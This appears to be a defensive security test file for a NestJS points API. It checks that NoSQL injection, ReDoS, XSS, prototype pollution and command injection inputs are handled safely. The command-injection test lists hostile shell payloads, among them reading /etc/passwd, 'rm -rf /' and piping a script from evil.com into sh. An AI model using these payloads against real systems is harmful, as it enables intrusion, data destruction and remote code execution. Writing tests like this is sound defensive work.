import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../app.module';
import { SupabaseAuthGuard } from '../auth/guards/supabase-auth.guard';
import { TestAuthGuard } from '../auth/guards/test-auth.guard';
import { setupTestApp } from '../common/test-setup';

process.env.SUPABASE_URL = 'https://test.supabase.co';
process.env.SUPABASE_ANON_KEY = 'test-anon-key';
process.env.SUPABASE_SERVICE_KEY = 'test-service-key';
process.env.JWT_SECRET = 'test-jwt-secret';

describe('NoSQL Injection Security Tests', () => {
  let app: INestApplication;
  let authToken: string;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    })
      .overrideGuard(SupabaseAuthGuard)
      .useClass(TestAuthGuard)
      .compile();

    app = moduleFixture.createNestApplication();
    setupTestApp(app);
    await app.init();

    authToken = 'test-token';
  });

  afterAll(async () => {
    if (app) {
      await app.close();
    }
  }, 30000);

  describe('MongoDB Injection Prevention', () => {
    it('should prevent $where injection in search queries', async () => {
      const response = await request(app.getHttpServer())
        .get('/points')
        .query({
          search: JSON.stringify({ $where: 'this.password.match(/.*/)' }),
        });

      expect(response.status).toBe(200);
      expect(response.body.data).toBeDefined();
      expect(response.body.data.length).toBe(0);
    });

    it('should prevent $ne injection for authentication bypass', async () => {
      const maliciousBody = {
        name: 'Test Point',
        category: 'architecture',
        latitude: 48.8566,
        longitude: 2.3522,
        userId: { $ne: null },
      };

      await request(app.getHttpServer())
        .post('/points')
        .set('Authorization', `Bearer ${authToken}`)
        .send(maliciousBody)
        .expect((res) => {
          expect(res.status).toBe(400);
          expect(res.body.message).toBeDefined();
        });
    });

    it('should sanitize aggregation pipeline injections', async () => {
      const maliciousPipeline = {
        category: {
          $lookup: {
            from: 'users',
            localField: '_id',
            foreignField: '_id',
            as: 'users',
          },
        },
      };

      const response = await request(app.getHttpServer())
        .get('/points')
        .query(maliciousPipeline);

      expect([200, 400]).toContain(response.status);
      if (response.status === 200) {
        expect(response.body.data).toBeDefined();
        expect(response.body.data.some((item: any) => item.users)).toBeFalsy();
      }
    });

    it('should prevent regex DOS attacks', async () => {
      const maliciousRegex = {
        search: '^(a+)+$'.repeat(1000),
      };

      const startTime = Date.now();

      const response = await request(app.getHttpServer())
        .get('/points')
        .query(maliciousRegex);

      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(5000);
      expect([200, 400, 431]).toContain(response.status);
    });
  });

  describe('XSS Prevention', () => {
    it('should handle HTML in point descriptions safely', async () => {
      const xssPayload = {
        name: 'XSS Test Point',
        description:
          '<script>alert("XSS")</script><img src=x onerror=alert("XSS")>',
        category: 'architecture',
        latitude: 48.8566,
        longitude: 2.3522,
      };

      const response = await request(app.getHttpServer())
        .post('/points')
        .set('Authorization', `Bearer ${authToken}`)
        .send(xssPayload);

      if (response.status === 201) {
        expect(response.body.description).toBe(xssPayload.description);

        await request(app.getHttpServer())
          .delete(`/points/${response.body._id}`)
          .set('Authorization', `Bearer ${authToken}`);
      } else {
        expect(response.status).toBe(400);
      }
    });

    it('should handle scripts in reviews', async () => {
      const xssReview = {
        rating: 5,
        comment: '"><script>document.cookie</script>',
      };

      const response = await request(app.getHttpServer())
        .post('/points/507f1f77bcf86cd799439011/reviews')
        .set('Authorization', `Bearer ${authToken}`)
        .send(xssReview);

      if (response.status === 201) {
        expect(response.body.comment).toBe(xssReview.comment);
      } else {
        expect([400, 404, 409]).toContain(response.status);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in search parameters', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`rm -rf /`',
        '$(curl evil.com/shell.sh | sh)',
      ];

      for (const payload of commandInjectionPayloads) {
        await request(app.getHttpServer())
          .get('/points')
          .query({ search: payload })
          .expect((res) => {
            expect([200, 400]).toContain(res.status);
            if (res.status === 200) {
              expect(res.body.data).toBeDefined();
            }
          });
      }
    });
  });

  describe('JSON Injection Prevention', () => {
    it('should handle malformed JSON gracefully', async () => {
      const malformedJsonStrings = [
        '{"name": "test", "category": "architecture"',
        '{"name": "test", "latitude": NaN}',
        '{"name": "test", "longitude": Infinity}',
      ];

      for (const jsonString of malformedJsonStrings) {
        await request(app.getHttpServer())
          .post('/points')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'application/json')
          .send(jsonString)
          .expect(400);
      }
    });

    it('should prevent prototype pollution', async () => {
      const prototypePayload = {
        name: 'Test Point',
        category: 'architecture',
        latitude: 48.8566,
        longitude: 2.3522,
        __proto__: { isAdmin: true },
        constructor: { prototype: { isAdmin: true } },
      };

      await request(app.getHttpServer())
        .post('/points')
        .set('Authorization', `Bearer ${authToken}`)
        .send(prototypePayload)
        .expect((res) => {
          expect([201, 400]).toContain(res.status);
          expect(({} as any).isAdmin).toBeUndefined();
        });
    });
  });
});
